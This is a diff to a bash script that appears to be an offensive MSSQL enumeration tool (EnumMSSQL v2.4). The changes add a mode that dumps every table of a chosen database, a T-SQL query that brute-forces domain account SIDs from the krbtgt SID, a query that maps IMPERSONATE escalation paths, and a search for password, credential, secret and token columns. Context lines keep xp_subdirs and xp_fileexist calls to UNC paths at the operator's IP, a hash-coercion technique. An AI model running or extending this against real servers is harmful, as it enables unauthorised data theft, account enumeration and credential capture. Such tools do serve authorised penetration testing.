@@ -19,6 +19,7 @@ S_NC=$(printf '\033[0m')
 
 # Default values
 DOMAIN=""
+RID=9999
 RPORT="1433"
 TMP_FILE="/tmp/.tmp_run_mssql_$$.sql"
 WIN_AUTH=""
@@ -46,7 +47,7 @@ banner() {
 | ____|_ __  _   _ _ __ ___ |  \/  / ___/ ___| / _ \| |    
 |  _| | '_ \| | | | '_ ` _ \| |\/| \___ \___ \| | | | |    
 | |___| | | | |_| | | | | | | |  | |___) |__) | |_| | |___ 
-|_____|_| |_|\__,_|_| |_| |_|_|  |_|____/____/ \__\_\_____| v2.3
+|_____|_| |_|\__,_|_| |_| |_|_|  |_|____/____/ \__\_\_____| v2.4
 EOF
     echo "                     https://github.com/tralsesec/EnumMSSQL   "
     echo -e "${NC}"
@@ -65,9 +66,10 @@ usage() {
     echo ""
     echo "Optional:"
     echo "  -d, --domain        Domain name (Leave blank for local SQL auth)"
+    echo "  -n, --rid           Specify how many RIDs to bruteforce (Default: 9999)"
     echo "  -P, --rport         Target MSSQL Port (Default: 1433)"
     echo "  -w, --windows-auth  Use Windows Authentication"
-    echo "  -D, --dump          DUMP MODE: Extract all non-system databases and tables to enum-mssql.dump"
+    echo "  -D, --dump [db]     DUMP MODE: Extract all non-system databases (or a specific DB if specified) to enum-mssql.dump"
     echo "  -h, --help          Show this help menu"
     exit 1
 }
@@ -121,7 +123,21 @@ while [[ "$#" -gt 0 ]]; do
         -P|--rport) RPORT="$2"; shift ;;
         -l|--lhost) LHOST="$2"; shift ;;
         -w|--win-auth|--windows-auth) WIN_AUTH="-windows-auth" ;;
-        -D|--dump) DUMP_MODE=1 ;;
+        -n|--rid) 
+            if [[ -z "$2" || ! "$2" =~ ^[0-9]+$ ]]; then
+                echo -e "${RED}[!] Error: -n/--rid requires a valid numeric value (e.g., --rid 5000).${NC}"
+                exit 1
+            fi
+            RID="$2"
+            shift 
+            ;;
+        -D|--dump) 
+            DUMP_MODE=1
+            if [[ -n "$2" && ! "$2" =~ ^- ]]; then
+                DUMP_DB="$2"
+                shift
+            fi
+            ;;
         -h|--help) banner; usage ;;
         *) echo -e "${RED}[!] Unknown parameter passed: $1${NC}"; usage ;;
     esac
@@ -164,11 +180,22 @@ fi
 # ==============================================================================
 if [[ "$DUMP_MODE" -eq 1 ]]; then
     echo -e "${BLUE}[*] DUMP MODE INITIATED.${NC}"
-    echo -e "${BLUE}[*] Generating bulletproof T-SQL extraction payload...${NC}"
     
-    cat << "EOF" > "$TMP_FILE"
+    if [[ -n "$DUMP_DB" ]]; then
+        echo -e "${BLUE}[*] Generating T-SQL extraction payload for database: ${GREEN}$DUMP_DB${NC}..."
+        cat << EOF > "$TMP_FILE"
+PRINT '=========================================';
+PRINT '[+] EXTRACTING DATABASE: $DUMP_DB';
+PRINT '=========================================';
+USE [$DUMP_DB]; 
+EXEC sp_MSforeachtable @command1='PRINT ''[+] TABLE: &''; SELECT * FROM &', @replacechar='&';
+EOF
+    else
+        echo -e "${BLUE}[*] Generating bulletproof T-SQL extraction payload for all custom databases...${NC}"
+        cat << "EOF" > "$TMP_FILE"
 EXEC sp_MSforeachdb 'IF ''?'' NOT IN (''master'', ''model'', ''msdb'', ''tempdb'') BEGIN PRINT ''=========================================''; PRINT ''[+] EXTRACTING DATABASE: ?''; PRINT ''=========================================''; USE [?]; EXEC sp_MSforeachtable @command1=''PRINT ''''[+] TABLE: &''''; SELECT * FROM &'', @replacechar=''&'' END';
 EOF
+    fi
 
     echo -e "${BLUE}[*] Executing payload and writing to ${GREEN}enum-mssql.dump${NC}... This may take a moment."
     
@@ -182,7 +209,7 @@ EOF
     if grep -q "\[+\] EXTRACTING DATABASE:" enum-mssql.dump; then
         echo -e "${GREEN}[+] Database extraction complete! Results saved to enum-mssql.dump${NC}"
     else
-        echo -e "${YELLOW}[!] No custom databases found to dump (only system defaults exist or permission denied).${NC}"
+        echo -e "${YELLOW}[!] No databases found to dump or permission denied.${NC}"
         echo "Nothing to dump." > enum-mssql.dump
     fi
     exit 0
@@ -295,6 +322,27 @@ EXEC master..xp_subdirs '\\\\${RESOLVED_IP}@80\\a';
 EXEC master..xp_subdirs '\\\\${RESOLVED_IP}\\a';
 EXEC master..xp_fileexist '\\\\${RESOLVED_IP}@80\\a';
 EXEC master..xp_fileexist '\\\\${RESOLVED_IP}\\a';
+PRINT '';
+
+PRINT '=========================================';
+PRINT '[+] PHASE 10: AD / Domain Account Enumeration & SID Resolution';
+PRINT '=========================================';
+PRINT '';
+DECLARE @f VARBINARY(85)=SUSER_SID(CONCAT(DEFAULT_DOMAIN(),N'\krbtgt'));WITH n(rid) AS (SELECT 500 UNION ALL SELECT rid+1 FROM n WHERE rid<${RID}) SELECT DISTINCT SUSER_SNAME(CONVERT(VARBINARY(85),SUBSTRING(@f,1,DATALENGTH(@f)-4))+CONVERT(VARBINARY(1),rid&255)+CONVERT(VARBINARY(1),(rid/256)&255)+CONVERT(VARBINARY(1),(rid/65536)&255)+CONVERT(VARBINARY(1),(rid/16777216)&255)) AS name FROM n WHERE SUSER_SNAME(CONVERT(VARBINARY(85),SUBSTRING(@f,1,DATALENGTH(@f)-4))+CONVERT(VARBINARY(1),rid&255)+CONVERT(VARBINARY(1),(rid/256)&255)+CONVERT(VARBINARY(1),(rid/65536)&255)+CONVERT(VARBINARY(1),(rid/16777216)&255)) IS NOT NULL OPTION(MAXRECURSION 0);
+PRINT '';
+
+PRINT '=========================================';
+PRINT '[+] PHASE 11: In-Depth Impersonation Path Mapping';
+PRINT '=========================================';
+PRINT '';
+SELECT grantee.name AS [Grantee_User], perm.permission_name AS [Permission_Type], target.name AS [Target_Identity] FROM sys.server_permissions perm JOIN sys.server_principals grantee ON perm.grantee_principal_id = grantee.principal_id JOIN sys.server_principals target ON perm.major_id = target.principal_id WHERE perm.permission_name = 'IMPERSONATE';
+PRINT '';
+
+PRINT '=========================================';
+PRINT '[+] PHASE 12: Data Classification (Sensitive Columns)';
+PRINT '=========================================';
+PRINT '';
+SELECT TABLE_CATALOG AS [Database], TABLE_SCHEMA AS [Schema], TABLE_NAME AS [Table], COLUMN_NAME AS [Column], DATA_TYPE AS [Type] FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%pass%' OR COLUMN_NAME LIKE '%cred%' OR COLUMN_NAME LIKE '%secret%' OR COLUMN_NAME LIKE '%token%';
 PRINT '';
 EOF
 
